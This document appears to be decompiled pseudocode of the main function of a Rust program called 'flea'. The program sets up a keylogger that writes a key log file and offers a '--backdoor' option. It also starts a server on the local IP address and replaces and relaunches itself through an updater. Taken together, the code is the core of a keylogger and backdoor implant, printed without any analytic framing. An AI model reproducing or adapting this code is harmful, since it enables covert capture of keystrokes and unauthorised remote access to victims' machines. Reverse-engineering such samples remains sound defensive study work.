__int64 flea::main()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rbx
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  int v7; // ebx
  int v8; // ebx
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  char v13; // bl
  __int64 v14; // rt0
  __int64 v15; // r14
  volatile signed __int64 *v16; // rax
  volatile signed __int64 *v17; // r14
  __int64 v18; // rt0
  __int64 v19; // rt0
  unsigned __int64 v20; // rax
  bool v21; // of
  __int64 v22; // rax
  __int64 v23; // rt0
  __int64 v24; // rax
  char v25; // dl
  __int64 v26; // rax
  __int64 v27; // rdx
  __int64 v28; // rax
  __int64 v29; // rdx
  __int64 v30; // rax
  __int64 v31; // rdx
  __int64 v32; // rax
  int v33; // ebx
  __int64 v34; // rax
  __int128 v35; // [rsp+20h] [rbp-438h] BYREF
  __int128 v36; // [rsp+30h] [rbp-428h]
  __int64 v37; // [rsp+40h] [rbp-418h]
  _BYTE v38[48]; // [rsp+50h] [rbp-408h] BYREF
  __int128 v39; // [rsp+80h] [rbp-3D8h]
  __int128 v40; // [rsp+90h] [rbp-3C8h]
  __int128 v41; // [rsp+A0h] [rbp-3B8h]
  __int64 v42; // [rsp+B0h] [rbp-3A8h]
  char v43; // [rsp+10Fh] [rbp-349h] BYREF
  __int128 v44; // [rsp+110h] [rbp-348h] BYREF
  __int64 v45; // [rsp+120h] [rbp-338h]
  __int128 v46; // [rsp+130h] [rbp-328h] BYREF
  __int128 v47; // [rsp+140h] [rbp-318h]
  __int128 v48; // [rsp+150h] [rbp-308h] BYREF
  __int64 v49; // [rsp+160h] [rbp-2F8h]
  __int128 v50; // [rsp+170h] [rbp-2E8h] BYREF
  __int128 v51; // [rsp+180h] [rbp-2D8h]
  __int128 v52; // [rsp+190h] [rbp-2C8h]
  __int128 v53; // [rsp+1A0h] [rbp-2B8h]
  __int128 v54; // [rsp+1B0h] [rbp-2A8h]
  __int64 v55; // [rsp+1C0h] [rbp-298h]
  volatile signed __int64 *v56; // [rsp+1D0h] [rbp-288h] BYREF
  __int64 v57; // [rsp+1D8h] [rbp-280h] BYREF
  __int128 v58; // [rsp+1E0h] [rbp-278h]
  __int128 v59; // [rsp+1F0h] [rbp-268h] BYREF
  __int128 v60; // [rsp+200h] [rbp-258h]
  __int128 v61; // [rsp+210h] [rbp-248h] BYREF
  __int128 v62; // [rsp+220h] [rbp-238h]
  __int128 v63; // [rsp+230h] [rbp-228h]
  _BYTE v64[8]; // [rsp+240h] [rbp-218h] BYREF
  __int64 v65; // [rsp+248h] [rbp-210h]
  __int64 v66; // [rsp+250h] [rbp-208h]
  _BYTE v67[8]; // [rsp+258h] [rbp-200h] BYREF
  __int64 v68; // [rsp+260h] [rbp-1F8h]
  __int64 v69; // [rsp+268h] [rbp-1F0h]
  _OWORD v70[2]; // [rsp+270h] [rbp-1E8h] BYREF
  __int128 v71; // [rsp+290h] [rbp-1C8h] BYREF
  __int64 v72; // [rsp+2A0h] [rbp-1B8h]
  __int128 v73; // [rsp+2B0h] [rbp-1A8h] BYREF
  __int64 v74; // [rsp+2C0h] [rbp-198h]
  volatile signed __int64 *v75; // [rsp+2C8h] [rbp-190h]
  _BYTE v76[8]; // [rsp+2D0h] [rbp-188h] BYREF
  __int64 v77; // [rsp+2D8h] [rbp-180h]
  __int64 v78; // [rsp+2E0h] [rbp-178h]
  __int64 v79; // [rsp+2E8h] [rbp-170h] BYREF
  __int128 v80; // [rsp+2F0h] [rbp-168h]
  _BYTE v81[8]; // [rsp+300h] [rbp-158h] BYREF
  __int64 v82; // [rsp+308h] [rbp-150h]
  __int64 v83; // [rsp+310h] [rbp-148h]
  __int128 v84; // [rsp+318h] [rbp-140h] BYREF
  __int64 v85; // [rsp+328h] [rbp-130h]
  __int128 v86; // [rsp+330h] [rbp-128h] BYREF
  __int64 v87; // [rsp+340h] [rbp-118h]
  _OWORD v88[2]; // [rsp+348h] [rbp-110h] BYREF
  _BYTE v89[17]; // [rsp+36Fh] [rbp-E9h] BYREF
  _OWORD v90[6]; // [rsp+380h] [rbp-D8h] BYREF
  __int64 v91; // [rsp+3E0h] [rbp-78h]
  __int64 v92; // [rsp+3E8h] [rbp-70h]
  __int64 v93; // [rsp+3F0h] [rbp-68h]
  __int16 v94; // [rsp+3F8h] [rbp-60h]
  _BYTE v95[80]; // [rsp+408h] [rbp-50h] BYREF

  env_logger::logger::init();
  if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER) >= 3 )
  {
    *(_QWORD *)v38 = &off_6F5958;
    *(_QWORD *)&v38[8] = 1LL;
    *(_QWORD *)&v38[16] = 8LL;
    *(_OWORD *)&v38[24] = 0LL;
    *(_QWORD *)&v50 = aFlea;
    *((_QWORD *)&v50 + 1) = 4LL;
    *(_QWORD *)&v51 = aFlea;
    *((_QWORD *)&v51 + 1) = 4LL;
    *(_QWORD *)&v52 = log::__private_api::loc(&off_6F59D8);
    log::__private_api::log(v38, 3LL, &v50);
  }
  std::env::args(v95);
  <alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter(v64, v95, &off_6F5868);
  std::env::current_exe(v38);
  core::result::Result<T,E>::unwrap(&v50, v38, &off_6F59F0);
  std::sys::os_str::bytes::Slice::to_str(v38, *((_QWORD *)&v50 + 1), v51);
  if ( *(_DWORD *)v38 == 1 )
    core::option::unwrap_failed(&off_6F5A08);
  <T as alloc::slice::hack::ConvertVec>::to_vec(v38, *(_QWORD *)&v38[8], *(_QWORD *)&v38[16]);
  v45 = *(_QWORD *)&v38[16];
  v44 = *(_OWORD *)v38;
  core::ptr::drop_in_place<std::path::PathBuf>(&v50);
  alloc::str::<impl str>::replace(v38, *((_QWORD *)&v44 + 1), v45, &unk_519D8);
  core::ptr::drop_in_place<alloc::string::String>(&v44);
  v45 = *(_QWORD *)&v38[16];
  v44 = *(_OWORD *)v38;
  alloc::str::<impl str>::replace(v38, *(_QWORD *)&v38[8], *(_QWORD *)&v38[16], asc_51698);
  core::ptr::drop_in_place<alloc::string::String>(&v44);
  v45 = *(_QWORD *)&v38[16];
  v44 = *(_OWORD *)v38;
  if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER) >= 3 )
  {
    *(_QWORD *)&v46 = &v44;
    *(_QWORD *)&v35 = &v46;
    *((_QWORD *)&v35 + 1) = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)v38 = &off_6F5968;
    *(_QWORD *)&v38[8] = 1LL;
    *(_QWORD *)&v38[32] = 0LL;
    *(_QWORD *)&v38[16] = &v35;
    *(_QWORD *)&v38[24] = 1LL;
    v0 = log::__private_api::loc(&off_6F5A20);
    *(_QWORD *)&v50 = aFlea;
    *((_QWORD *)&v50 + 1) = 4LL;
    *(_QWORD *)&v51 = aFlea;
    *((_QWORD *)&v51 + 1) = 4LL;
    *(_QWORD *)&v52 = v0;
    log::__private_api::log(v38, 3LL, &v50);
  }
  LODWORD(v50) = 0;
  v1 = core::char::methods::encode_utf8_raw(47LL, &v50);
  <T as alloc::slice::hack::ConvertVec>::to_vec(v38, v1, v2);
  v72 = *(_QWORD *)&v38[16];
  v71 = *(_OWORD *)v38;
  v3 = v45;
  <&alloc::string::String as core::str::pattern::Pattern>::into_searcher(v38, &v71, *((_QWORD *)&v44 + 1), v45);
  v91 = v42;
  v90[5] = v41;
  v90[4] = v40;
  v90[3] = v39;
  v90[2] = *(_OWORD *)&v38[32];
  v90[1] = *(_OWORD *)&v38[16];
  v90[0] = *(_OWORD *)v38;
  v92 = 0LL;
  v93 = v3;
  v94 = 1;
  <alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter(v76, v90, &off_6F5868);
  *(_QWORD *)&v48 = 0LL;
  *((_QWORD *)&v48 + 1) = 1LL;
  v49 = 0LL;
  *(_QWORD *)&v35 = v77;
  *((_QWORD *)&v35 + 1) = v77 + 16 * v78;
  v4 = v78 - 1;
  if ( v78 == 1 )
    goto LABEL_14;
  do
  {
    *(_QWORD *)&v36 = v4 - 1;
    v5 = <core::slice::iter::Iter<T> as core::iter::traits::iterator::Iterator>::next(&v35);
    if ( !v5 )
      break;
    *(_QWORD *)&v70[0] = v5;
    if ( *(_QWORD *)(v5 + 8) )
    {
      *(_QWORD *)&v46 = v70;
      *(_QWORD *)&v50 = &v71;
      *((_QWORD *)&v50 + 1) = <alloc::string::String as core::fmt::Display>::fmt;
      *(_QWORD *)&v51 = &v46;
      *((_QWORD *)&v51 + 1) = <&T as core::fmt::Display>::fmt;
      *(_QWORD *)v38 = "\x01";
      *(_QWORD *)&v38[8] = 2LL;
      *(_QWORD *)&v38[32] = 0LL;
      *(_QWORD *)&v38[16] = &v50;
      *(_QWORD *)&v38[24] = 2LL;
      core::option::Option<T>::map_or_else(&v84, v38);
      *(_OWORD *)v38 = v84;
      *(_QWORD *)&v38[16] = v85;
      alloc::vec::Vec<T,A>::append_elements(&v48, *((_QWORD *)&v84 + 1), v85, &off_6F5898);
      core::ptr::drop_in_place<alloc::string::String>(v38);
    }
    v4 = v36;
  }
  while ( (_QWORD)v36 );
  if ( !v49 )
  {
LABEL_14:
    std::env::current_dir(v38);
    core::result::Result<T,E>::unwrap(&v50, v38, &off_6F5A38);
    std::sys::os_str::bytes::Slice::to_str(v38, *((_QWORD *)&v50 + 1), v51);
    if ( *(_DWORD *)v38 == 1 )
      core::option::unwrap_failed(&off_6F5A50);
    <T as alloc::slice::hack::ConvertVec>::to_vec(v38, *(_QWORD *)&v38[8], *(_QWORD *)&v38[16]);
    *(_QWORD *)&v36 = *(_QWORD *)&v38[16];
    v35 = *(_OWORD *)v38;
    core::ptr::drop_in_place<alloc::string::String>(&v48);
    v49 = v36;
    v48 = v35;
    core::ptr::drop_in_place<std::path::PathBuf>(&v50);
  }
  else
  {
    *(_QWORD *)&v35 = &v48;
    *(_QWORD *)&v50 = &v35;
    *((_QWORD *)&v50 + 1) = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)v38 = &off_6F5978;
    *(_QWORD *)&v38[8] = 2LL;
    *(_QWORD *)&v38[32] = 0LL;
    *(_QWORD *)&v38[16] = &v50;
    *(_QWORD *)&v38[24] = 1LL;
    core::option::Option<T>::map_or_else(&v86, v38);
    *(_OWORD *)v38 = v86;
    *(_QWORD *)&v38[16] = v87;
    v6 = std::env::set_current_dir(&v48);
    core::result::Result<T,E>::expect(v6, *(_QWORD *)&v38[8], *(_QWORD *)&v38[16], &off_6F5A68);
    core::ptr::drop_in_place<alloc::string::String>(v38);
  }
  std::fs::metadata(v38, aFleaBak, 8LL);
  v7 = *(_DWORD *)v38;
  core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(v38);
  if ( v7 != 2 )
  {
    *(_QWORD *)v38 = std::fs::remove_file(aFleaBak, 8LL);
    core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v38);
  }
  std::fs::metadata(v38, "flea.rst@", 8LL);
  v8 = *(_DWORD *)v38;
  core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(v38);
  if ( v8 != 2 )
  {
    *(_QWORD *)v38 = std::fs::remove_file("flea.rst@", 8LL);
    core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v38);
  }
  flea::updater::find_update(&v46, *((_QWORD *)&v48 + 1), v49, aFleaUpd, 8LL);
  if ( !__OFSUB__(0LL, (_QWORD)v46) )
  {
    *(_QWORD *)&v36 = v47;
    v35 = v46;
    if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER) >= 3 )
    {
      *(_QWORD *)&v70[0] = &v35;
      *((_QWORD *)&v70[0] + 1) = <alloc::string::String as core::fmt::Display>::fmt;
      *(_QWORD *)v38 = &off_6F5998;
      *(_QWORD *)&v38[8] = 1LL;
      *(_QWORD *)&v38[32] = 0LL;
      *(_QWORD *)&v38[16] = v70;
      *(_QWORD *)&v38[24] = 1LL;
      v12 = log::__private_api::loc(&off_6F5A80);
      *(_QWORD *)&v50 = aFlea;
      *((_QWORD *)&v50 + 1) = 4LL;
      *(_QWORD *)&v51 = aFlea;
      *((_QWORD *)&v51 + 1) = 4LL;
      *(_QWORD *)&v52 = v12;
      log::__private_api::log(v38, 3LL, &v50);
    }
    v10 = std::fs::rename(aFlea, 4LL, aFleaBak, 8LL);
    core::result::Result<T,E>::expect(v10, aCouldnTRenameT_0, 33LL, &off_6F5A98);
    *(_QWORD *)&v38[16] = v36;
    *(_OWORD *)v38 = v35;
    v11 = std::fs::rename(v38, aFlea, 4LL);
    core::result::Result<T,E>::expect(v11, aCouldnTRenameT, 32LL, &off_6F5AB0);
    <T as alloc::slice::hack::ConvertVec>::to_vec(v38, aFlea, 4LL);
    *(_QWORD *)&v51 = *(_QWORD *)&v38[16];
    v50 = *(_OWORD *)v38;
    flea::updater::start_new_process(&v48, &v50);
    std::process::exit(0);
  }
  core::ptr::drop_in_place<core::option::Option<alloc::string::String>>(&v46);
  local_ip_address::local_ip(v38);
  core::result::Result<T,E>::unwrap(v89, v38);
  if ( !v66 )
    core::panicking::panic_bounds_check(0LL, 0LL, &off_6F5AE0);
  <alloc::string::String as core::clone::Clone>::clone(v67, v65);
  *(_QWORD *)&v59 = 0LL;
  *((_QWORD *)&v59 + 1) = 8LL;
  *(_QWORD *)&v60 = 0LL;
  WORD4(v60) = 0;
  getopts::Options::optopt(
    (unsigned int)&v59,
    (unsigned int)aS_14,
    1,
    (unsigned int)aServer,
    6,
    (unsigned int)&unk_51A53,
    22LL,
    (__int64)aLeaveEmptyToLi,
    44LL);
  getopts::Options::optflag(
    (unsigned int)&v59,
    (unsigned int)aB_7,
    1,
    (unsigned int)aBackdoor,
    8,
    (unsigned int)&unk_51A96,
    40LL);
  getopts::Options::optflag(
    (unsigned int)&v59,
    (unsigned int)asc_51ABE,
    1,
    (unsigned int)aHelp,
    4,
    (unsigned int)&unk_51ABF,
    20LL);
  if ( !v66 )
    core::slice::index::slice_start_index_len_fail(1LL, 0LL, &off_6F5C00);
  getopts::Options::parse(v38, &v59, v65 + 24, v66 - 1);
  if ( *(_DWORD *)v38 != 2 )
  {
    v55 = v41;
    v54 = v40;
    v53 = v39;
    v52 = *(_OWORD *)&v38[32];
    v51 = *(_OWORD *)&v38[16];
    v50 = *(_OWORD *)v38;
    if ( (unsigned __int8)getopts::Matches::opt_present(&v50, asc_51ABE, 1LL) )
    {
      *(_OWORD *)&v38[16] = v60;
      *(_OWORD *)v38 = v59;
      flea::print_usage(v68, v69, (__int64)v38);
      core::ptr::drop_in_place<getopts::Matches>(&v50);
      goto LABEL_27;
    }
    getopts::Matches::opt_str(&v79, &v50, aS_14, 1LL);
    v13 = getopts::Matches::opt_present(&v50, aB_7, 1LL);
    *(_QWORD *)v38 = 1LL;
    *(_QWORD *)&v38[8] = 1LL;
    v38[16] = 1;
    v56 = (volatile signed __int64 *)alloc::boxed::Box<T>::new(v38);
    v14 = _InterlockedIncrement64(v56);
    if ( !((v14 < 0) ^ v21 | (v14 == 0)) )
    {
      ctrlc::init_and_set_handler(v38, v56, 1LL);
      core::result::Result<T,E>::expect(v38);
      std::env::current_dir(v38);
      core::result::Result<T,E>::expect(v81, v38);
      std::path::Path::join(&v35, v82, v83, aFleaKeyLog, 12LL);
      std::sys::os_str::bytes::Slice::to_str(v38, *((_QWORD *)&v35 + 1), v36);
      if ( *(_DWORD *)v38 == 1 )
        core::option::unwrap_failed(&off_6F5B28);
      <T as alloc::slice::hack::ConvertVec>::to_vec(v38, *(_QWORD *)&v38[8], *(_QWORD *)&v38[16]);
      v74 = *(_QWORD *)&v38[16];
      v73 = *(_OWORD *)v38;
      core::ptr::drop_in_place<std::path::PathBuf>(&v35);
      flealib::keylogger::remove_keylog_file(v38, &v73);
      core::ptr::drop_in_place<alloc::string::String>(v38);
      <T as alloc::string::SpecToString>::spec_to_string(&v57, v89);
      v15 = v79;
      if ( v79 != 0x8000000000000000LL )
      {
        *(_OWORD *)v38 = v80;
        core::ptr::drop_in_place<alloc::string::String>(&v57);
        v57 = v15;
        v58 = *(_OWORD *)v38;
      }
      <T as alloc::slice::hack::ConvertVec>::to_vec(v38, a1972, 5LL);
      *(_QWORD *)&v36 = *(_QWORD *)&v38[16];
      v35 = *(_OWORD *)v38;
      alloc::vec::Vec<T,A>::append_elements(&v57, *(_QWORD *)&v38[8], *(_QWORD *)&v38[16], &off_6F5898);
      core::ptr::drop_in_place<alloc::string::String>(&v35);
      *(_QWORD *)v38 = 1LL;
      *(_QWORD *)&v38[8] = 1LL;
      *(_DWORD *)&v38[16] = 0;
      *(_WORD *)&v38[20] = 0;
      v16 = (volatile signed __int64 *)alloc::boxed::Box<T>::new(v38);
      v17 = v16;
      v75 = v16;
      v18 = _InterlockedIncrement64(v16);
      if ( !((v18 < 0) ^ v21 | (v18 == 0)) )
      {
        *(_QWORD *)&v47 = v74;
        v46 = v73;
        *((_QWORD *)&v47 + 1) = v16;
        *(_QWORD *)&v62 = 0x8000000000000000LL;
        *(_QWORD *)&v61 = 0LL;
        BYTE8(v63) = 0;
        *(_QWORD *)&v38[32] = v63;
        v38[40] = 0;
        *(_DWORD *)&v38[41] = *(_DWORD *)((char *)&v63 + 9);
        *(_WORD *)&v38[45] = *(_WORD *)((char *)&v63 + 13);
        v38[47] = HIBYTE(v63);
        *(_OWORD *)&v38[16] = __PAIR128__(*((unsigned __int64 *)&v62 + 1), 0x8000000000000000LL);
        *(_OWORD *)v38 = v61;
        std::thread::Builder::spawn_unchecked(&v35, v38, &v46);
        core::result::Result<T,E>::expect(v88, &v35);
        v19 = _InterlockedIncrement64(v17);
        if ( !((v19 < 0) ^ v21 | (v19 == 0)) )
        {
          *(_OWORD *)&v38[32] = v63;
          *(_OWORD *)&v38[16] = v62;
          *(_OWORD *)v38 = v61;
          std::thread::Builder::spawn_unchecked(&v35, v38, v17);
          core::result::Result<T,E>::expect(v70, &v35);
          if ( !v13 )
          {
            *(_QWORD *)&v46 = 2LL;
LABEL_49:
            flealib::fleaserver::FleaServer::start(&v43, v58, *((_QWORD *)&v58 + 1), &v56);
            std::sync::mutex::Mutex<T>::lock(v38, v17 + 2);
            v24 = core::result::Result<T,E>::unwrap(v38);
            *(_BYTE *)(v24 + 5) = 1;
            core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v24, v25 & 1);
            *(_OWORD *)&v38[16] = v88[1];
            *(_OWORD *)v38 = v88[0];
            v26 = std::thread::JoinInner<T>::join(v38);
            core::result::Result<T,E>::unwrap(v26, v27, &off_6F5B88);
            *(_OWORD *)&v38[16] = v70[1];
            *(_OWORD *)v38 = v70[0];
            v28 = std::thread::JoinInner<T>::join(v38);
            core::result::Result<T,E>::unwrap(v28, v29, &off_6F5BA0);
            if ( (_DWORD)v46 != 2 )
            {
              *(_OWORD *)&v38[16] = v47;
              *(_OWORD *)v38 = v46;
              v30 = std::thread::JoinInner<T>::join(v38);
              core::result::Result<T,E>::unwrap(v30, v31, &off_6F5BB8);
            }
            if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER) > 2 )
            {
              *(_QWORD *)v38 = &off_6F59B8;
              *(_QWORD *)&v38[8] = 1LL;
              *(_QWORD *)&v38[16] = 8LL;
              *(_OWORD *)&v38[24] = 0LL;
              v32 = log::__private_api::loc(&off_6F5BD0);
              *(_QWORD *)&v35 = aFlea;
              *((_QWORD *)&v35 + 1) = 4LL;
              *(_QWORD *)&v36 = aFlea;
              *((_QWORD *)&v36 + 1) = 4LL;
              v37 = v32;
              log::__private_api::log(v38, 3LL, &v35);
            }
            std::fs::metadata(v38, "flea.rst@", 8LL);
            v33 = *(_DWORD *)v38;
            core::ptr::drop_in_place<core::result::Result<std::fs::Metadata,std::io::error::Error>>(v38);
            if ( v33 != 2 )
            {
              *(_QWORD *)v38 = std::fs::remove_file("flea.rst@", 8LL);
              core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v38);
              <T as alloc::slice::hack::ConvertVec>::to_vec(v38, aFlea, 4LL);
              *(_QWORD *)&v36 = *(_QWORD *)&v38[16];
              v35 = *(_OWORD *)v38;
              flea::updater::start_new_process(&v48, &v35);
              if ( (unsigned __int64)core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER) >= 3 )
              {
                *(_QWORD *)v38 = &off_6F59C8;
                *(_QWORD *)&v38[8] = 1LL;
                *(_QWORD *)&v38[16] = 8LL;
                *(_OWORD *)&v38[24] = 0LL;
                v34 = log::__private_api::loc(&off_6F5BE8);
                *(_QWORD *)&v35 = aFlea;
                *((_QWORD *)&v35 + 1) = 4LL;
                *(_QWORD *)&v36 = aFlea;
                *((_QWORD *)&v36 + 1) = 4LL;
                v37 = v34;
                log::__private_api::log(v38, 3LL, &v35);
              }
            }
            std::process::exit(0);
          }
          v20 = core::sync::atomic::atomic_load(&log::MAX_LOG_LEVEL_FILTER);
          v21 = __OFSUB__(v20, 3LL);
          if ( v20 > 3 )
          {
            *(_QWORD *)v38 = &off_6F59A8;
            *(_QWORD *)&v38[8] = 1LL;
            *(_QWORD *)&v38[16] = 8LL;
            *(_OWORD *)&v38[24] = 0LL;
            v22 = log::__private_api::loc(&off_6F5B58);
            *(_QWORD *)&v35 = aFlea;
            *((_QWORD *)&v35 + 1) = 4LL;
            *(_QWORD *)&v36 = aFlea;
            *((_QWORD *)&v36 + 1) = 4LL;
            v37 = v22;
            log::__private_api::log(v38, 4LL, &v35);
          }
          v23 = _InterlockedIncrement64(v17);
          if ( !((v23 < 0) ^ v21 | (v23 == 0)) )
          {
            std::thread::Builder::spawn_unchecked(v38, &v61, v17);
            core::result::Result<T,E>::expect(&v35, v38);
            v46 = v35;
            v47 = v36;
            goto LABEL_49;
          }
        }
      }
    }
    BUG();
  }
  v36 = *(_OWORD *)&v38[24];
  v35 = *(_OWORD *)&v38[8];
  *(_QWORD *)&v46 = &v35;
  *((_QWORD *)&v46 + 1) = <getopts::Fail as core::fmt::Display>::fmt;
  *(_QWORD *)&v50 = &unk_6F5938;
  *((_QWORD *)&v50 + 1) = 2LL;
  *(_QWORD *)&v52 = 0LL;
  *(_QWORD *)&v51 = &v46;
  *((_QWORD *)&v51 + 1) = 1LL;
  std::io::stdio::_print(&v50);
  v51 = v60;
  v50 = v59;
  flea::print_usage(v68, v69, (__int64)&v50);
  core::ptr::drop_in_place<getopts::Fail>(&v35);
LABEL_27:
  core::ptr::drop_in_place<alloc::string::String>(v67);
  core::ptr::drop_in_place<alloc::string::String>(&v48);
  core::ptr::drop_in_place<alloc::vec::Vec<&str>>(v76);
  core::ptr::drop_in_place<alloc::string::String>(&v71);
  core::ptr::drop_in_place<alloc::string::String>(&v44);
  return core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v64);
}